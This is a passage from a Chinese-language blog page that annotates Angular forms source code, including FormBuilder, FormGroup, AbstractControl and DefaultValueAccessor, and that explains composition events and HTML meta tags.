</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>_reduceControls() 方法的内部实现：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">_reduceControls</span><span class="token punctuation">(</span>controlsConfig<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>k<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> AbstractControl<span class="token punctuation">}</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> controls<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> AbstractControl<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// controlsConfig - {name: [...], account: this.fb.group(...)}</span>
    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>controlsConfig<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">controlName</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token comment">// 获取控件的名称，然后基于控件对应的配置信息，创建FormControl控件，并保存到controls对象上</span>
      controls<span class="token punctuation">[</span>controlName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_createControl</span><span class="token punctuation">(</span>controlsConfig<span class="token punctuation">[</span>controlName<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> controls<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>_createControl() 方法的内部实现：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">_createControl</span><span class="token punctuation">(</span>controlConfig<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> AbstractControl <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>controlConfig <span class="token keyword">instanceof</span> <span class="token class-name">FormControl</span> <span class="token operator">||</span> controlConfig <span class="token keyword">instanceof</span> <span class="token class-name">FormGroup</span> <span class="token operator">||</span>
        controlConfig <span class="token keyword">instanceof</span> <span class="token class-name">FormArray</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> controlConfig<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>controlConfig<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// controlConfig - ['', [Validators.required, Validators.minLength(2)]]</span>
      <span class="token keyword">const</span> value <span class="token operator">=</span> controlConfig<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 获取初始值</span>
      <span class="token comment">// 获取同步验证器</span>
      <span class="token keyword">const</span> validator<span class="token operator">:</span> ValidatorFn <span class="token operator">=</span> controlConfig<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token operator">?</span> controlConfig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      <span class="token comment">// 获取异步验证器</span>
      <span class="token keyword">const</span> asyncValidator<span class="token operator">:</span> AsyncValidatorFn <span class="token operator">=</span> controlConfig<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token operator">?</span> 
            controlConfig<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      <span class="token comment">// 创建FormControl控件</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">control</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> validator<span class="token punctuation">,</span> asyncValidator<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">control</span><span class="token punctuation">(</span>controlConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>control() 方法的内部实现：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">control</span><span class="token punctuation">(</span>
      formState<span class="token operator">:</span> Object<span class="token punctuation">,</span> 
      validator<span class="token operator">:</span> ValidatorFn<span class="token operator">|</span>ValidatorFn<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
      asyncValidator<span class="token operator">:</span> AsyncValidatorFn<span class="token operator">|</span>AsyncValidatorFn<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> FormControl <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">FormControl</span><span class="token punctuation">(</span>formState<span class="token punctuation">,</span> validator<span class="token punctuation">,</span> asyncValidator<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p><code>this.fb.group({...}, { validator: someCustomValidator })</code> 等价于 <code>new FormGroup({...}, someCustomValidator)</code></p></div> <ul><li>FormGroup</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token comment">// angular2/packages/forms/src/model.ts  片段</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">FormGroup</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractControl</span> <span class="token punctuation">{</span>
  <span class="token keyword">constructor</span><span class="token punctuation">(</span>
      <span class="token parameter"><span class="token keyword">public</span> controls<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">:</span> AbstractControl<span class="token punctuation">}</span><span class="token punctuation">,</span> 
      validator<span class="token operator">:</span> ValidatorFn <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
      asyncValidator<span class="token operator">:</span> AsyncValidatorFn <span class="token operator">=</span> <span class="token keyword">null</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>validator<span class="token punctuation">,</span> asyncValidator<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_initObservables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_setUpControls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">{</span>onlySelf<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> emitEvent<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>  
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>通过源码我们发现，FormGroup 类继承于 AbstractControl 类。在创建 FormGroup 对象时，会把 validator 和 asyncValidator 作为参数，然后通过 super 关键字调用基类 AbstractControl 的构造函数。</p> <ul><li>AbstractControl</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token comment">// angular2/packages/forms/src/model.ts 片段</span>
<span class="token keyword">export</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractControl</span> <span class="token punctuation">{</span>
  _value<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">;</span>
  <span class="token operator">...</span>
  <span class="token keyword">private</span> _valueChanges<span class="token operator">:</span> EventEmitter<span class="token operator">&lt;</span><span class="token builtin">any</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> _statusChanges<span class="token operator">:</span> EventEmitter<span class="token operator">&lt;</span><span class="token builtin">any</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> _status<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> _errors<span class="token operator">:</span> ValidationErrors<span class="token operator">|</span><span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> _pristine<span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> _touched<span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> validator<span class="token operator">:</span> ValidatorFn<span class="token punctuation">,</span> <span class="token keyword">public</span> asyncValidator<span class="token operator">:</span> AsyncValidatorFn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token comment">// 获取控件的valid状态，用于表示控件是否通过验证    </span>
  <span class="token keyword">get</span> <span class="token function">valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">===</span> <span class="token constant">VALID</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
  <span class="token comment">// 获取控件的invalid状态，用于表示控件是否通过验证</span>
  <span class="token keyword">get</span> <span class="token function">invalid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_status <span class="token operator">===</span> <span class="token constant">INVALID</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
  <span class="token comment">// 获取控件的pristine状态，用于表示控件值未改变</span>
  <span class="token keyword">get</span> <span class="token function">pristine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_pristine<span class="token punctuation">;</span> <span class="token punctuation">}</span> 
  <span class="token comment">// 获取控件的dirty状态，用于表示控件值已改变</span>
  <span class="token keyword">get</span> <span class="token function">dirty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>pristine<span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token comment">// 获取控件的touched状态，用于表示控件已被访问过</span>
  <span class="token keyword">get</span> <span class="token function">touched</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_touched<span class="token punctuation">;</span> <span class="token punctuation">}</span> 
  <span class="token operator">...</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><ul><li>DEFAULT_VALUE_ACCESSOR</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">DEFAULT_VALUE_ACCESSOR</span><span class="token operator">:</span> any <span class="token operator">=</span> <span class="token punctuation">{</span>
  provide<span class="token operator">:</span> <span class="token constant">NG_VALUE_ACCESSOR</span><span class="token punctuation">,</span>
  useExisting<span class="token operator">:</span> <span class="token function">forwardRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> DefaultValueAccessor<span class="token punctuation">)</span><span class="token punctuation">,</span>
  multi<span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><ul><li>DefaultValueAccessor</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DefaultValueAccessor</span> <span class="token keyword">implements</span> <span class="token class-name">ControlValueAccessor</span> <span class="token punctuation">{</span>
  <span class="token function-variable function">onChange</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">_<span class="token operator">:</span> <span class="token builtin">any</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token function-variable function">onTouched</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token comment">/** Whether the user is creating a composition string (IME events). */</span>
  <span class="token keyword">private</span> _composing <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

  <span class="token keyword">constructor</span><span class="token punctuation">(</span>
      <span class="token keyword">private</span> _renderer<span class="token operator">:</span> Renderer<span class="token punctuation">,</span> <span class="token comment">// 注入Renderer对象</span>
      <span class="token keyword">private</span> _elementRef<span class="token operator">:</span> ElementRef<span class="token punctuation">,</span>
      @<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Inject</span><span class="token punctuation">(</span><span class="token constant">COMPOSITION_BUFFER_MODE</span><span class="token punctuation">)</span> 
        <span class="token keyword">private</span> _compositionMode<span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_compositionMode <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>_compositionMode <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">_isAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 将模型中的新值写入视图或DOM元素属性中</span>
  <span class="token function">writeValue</span><span class="token punctuation">(</span>value<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> normalizedValue <span class="token operator">=</span> value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token operator">:</span> value<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_renderer<span class="token punctuation">.</span><span class="token function">setElementProperty</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_elementRef<span class="token punctuation">.</span>nativeElement<span class="token punctuation">,</span> 
         <span class="token string">'value'</span><span class="token punctuation">,</span> normalizedValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 设置当控件接收到change事件后，调用的函数</span>
  <span class="token function">registerOnChange</span><span class="token punctuation">(</span><span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">_<span class="token operator">:</span> <span class="token builtin">any</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onChange <span class="token operator">=</span> fn<span class="token punctuation">;</span> <span class="token punctuation">}</span>
  
  <span class="token comment">// 设置当控件接收到touched事件后，调用的函数</span>
  <span class="token function">registerOnTouched</span><span class="token punctuation">(</span><span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onTouched <span class="token operator">=</span> fn<span class="token punctuation">;</span> <span class="token punctuation">}</span>

  <span class="token comment">// 设置控件的Disabled状态</span>
  <span class="token function">setDisabledState</span><span class="token punctuation">(</span>isDisabled<span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_renderer<span class="token punctuation">.</span><span class="token function">setElementProperty</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_elementRef<span class="token punctuation">.</span>nativeElement<span class="token punctuation">,</span> 
      <span class="token string">'disabled'</span><span class="token punctuation">,</span> isDisabled<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 处理input事件</span>
  <span class="token function">_handleInput</span><span class="token punctuation">(</span>value<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_compositionMode <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_compositionMode <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_composing<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onChange</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 处理compositionstart事件</span>
  <span class="token function">_compositionStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_composing <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

  <span class="token comment">// 处理compositionend事件</span>
  <span class="token function">_compositionEnd</span><span class="token punctuation">(</span>value<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_composing <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_compositionMode <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onChange</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">COMPOSITION_BUFFER_MODE</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token operator">&lt;</span><span class="token builtin">boolean</span><span class="token operator">&gt;</span>
  <span class="token punctuation">(</span><span class="token string">'CompositionEventMode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 用于判断是否处于安卓平台，composition事件在iOS和Android存在兼容性</span>
<span class="token keyword">function</span> <span class="token function">_isAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> userAgent <span class="token operator">=</span> <span class="token function">getDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">getDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserAgent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">/</span><span class="token function">android</span> <span class="token punctuation">(</span>\d<span class="token operator">+</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>userAgent<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br></div></div><h3 id="compositionstart-end"><a href="#compositionstart-end" class="header-anchor">#</a> compositionstart/end</h3> <ul><li>compositionstart - 事件触发于一段文字的输入之前 (类似于 keydown 事件，但是该事件仅在若干可见字符的输入之前，而这些可见字符的输入可能需要一连串的键盘操作、语音识别或者点击输入法的备选词)。</li> <li>compositionend - 事件触发于完成文本段落输入或取消输入
compositionstart、compositionend 的实际应用，请参考 - <a href="https://www.cnblogs.com/chyingp/p/3599641.html" target="_blank" rel="noopener noreferrer">应对中文输入法的字符串截断方案<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul> <h2 id="rxjs"><a href="#rxjs" class="header-anchor">#</a> rxjs</h2> <p>Reative Extension，源自于微软，火于NetFlix , 请见我的另外一篇系统介绍的 <a href="/vuebloger/technology/rxjs心得总结.html">rxjs心得总结</a> 一文</p> <h2 id="meta-titleservice-详解"><a href="#meta-titleservice-详解" class="header-anchor">#</a> Meta/TitleService 详解</h2> <h3 id="meta"><a href="#meta" class="header-anchor">#</a> meta</h3> <p>共有两个属性，分别是 name 属性和 http-equiv 属性：</p> <p>name：主要用于描述网页，比如网页的关键词，网站描述等。与之对应的属性值为 content，content 中的内容是对 name 填入类型的具体描述，便于搜索引擎抓取。比如我们常见的 viewport：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>width=device-width,initial-scale=1,maximum-scale=1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>http-equiv：相当于文件的头作用，用于向浏览器传递一些有用的信息，以帮助正确地显示网页内容，与之对应的属性为 content。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>X-UA-Compatible<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>IE=edge<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>以上代码告诉 IE 浏览器，IE8/9 及以后的版本都会以最高版本 IE 来渲染页面。
